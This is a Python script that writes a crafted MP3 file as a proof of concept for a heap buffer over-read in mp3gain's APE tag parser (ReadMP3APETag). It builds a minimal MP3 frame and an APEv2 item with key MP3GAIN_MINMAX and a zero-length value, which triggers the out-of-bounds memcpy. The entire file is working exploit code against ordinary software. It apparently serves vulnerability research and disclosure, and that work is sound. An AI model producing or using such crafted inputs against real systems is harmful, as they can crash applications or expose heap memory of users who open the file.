#!/usr/bin/env python3
"""
VULN 002: heap-buffer-over-read in ReadMP3APETag (apetag.c:244-265)
Tag item key = "MP3GAIN_MINMAX", value_size = 0
The code unconditionally does memcpy(tmpString, vp, 3) even though
only 1 byte (the null terminator sentinel) was allocated for value.
"""
import struct
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.mp3")

# ---------------------------------------------------------------------------
# Minimal valid MP3 frame: sync word 0xFF 0xFB (MPEG1, Layer3, 128kbps),
# header byte 0x90 (44100 Hz, stereo), pad 0x00.
# A 128 kbps / 44100 Hz frame is 417 bytes.
# ---------------------------------------------------------------------------
MP3_FRAME_HEADER = bytes([0xFF, 0xFB, 0x90, 0x00])
MP3_FRAME = MP3_FRAME_HEADER + bytes(417 - 4)   # 417 bytes total

# ---------------------------------------------------------------------------
# APEv2 item: value_size=0, key="MP3GAIN_MINMAX"
#   Layout: value_size(4B LE) | item_flags(4B LE) | key\x00 | value(0 bytes)
# ---------------------------------------------------------------------------
KEY = b"MP3GAIN_MINMAX\x00"          # 15 bytes (14 chars + null)
ITEM_VALUE_SIZE = 0
ITEM_FLAGS      = 0

item = struct.pack("<II", ITEM_VALUE_SIZE, ITEM_FLAGS) + KEY
# no value bytes (value_size == 0)

# ---------------------------------------------------------------------------
# APEv2 footer (32 bytes)
#   "APETAGEX" | version(LE32=2000) | tag_size(LE32) | item_count(LE32)
#   | flags(LE32) | reserved(8 zero bytes)
#
# tag_size = len(items) + 32  (footer counts toward tag_size per spec)
# ---------------------------------------------------------------------------
FOOTER_SIZE  = 32
TAG_SIZE     = len(item) + FOOTER_SIZE   # 23 + 32 = 55
ITEM_COUNT   = 1
TAG_FLAGS    = 0x00000000                # footer-only tag

footer = (
    b"APETAGEX"
    + struct.pack("<I", 2000)            # version
    + struct.pack("<I", TAG_SIZE)        # Length field mp3gain reads as TagLen
    + struct.pack("<I", ITEM_COUNT)      # TagCount
    + struct.pack("<I", TAG_FLAGS)
    + bytes(8)                           # reserved
)
assert len(footer) == FOOTER_SIZE

# ---------------------------------------------------------------------------
# Assemble file
# ---------------------------------------------------------------------------
data = MP3_FRAME + item + footer

with open(OUT, "wb") as f:
    f.write(data)

print(f"[+] Written {len(data)} bytes to {OUT}")
print(f"    MP3 frame : {len(MP3_FRAME)} bytes")
print(f"    APE item  : {len(item)} bytes  (vsize={ITEM_VALUE_SIZE})")
print(f"    APE footer: {len(footer)} bytes")
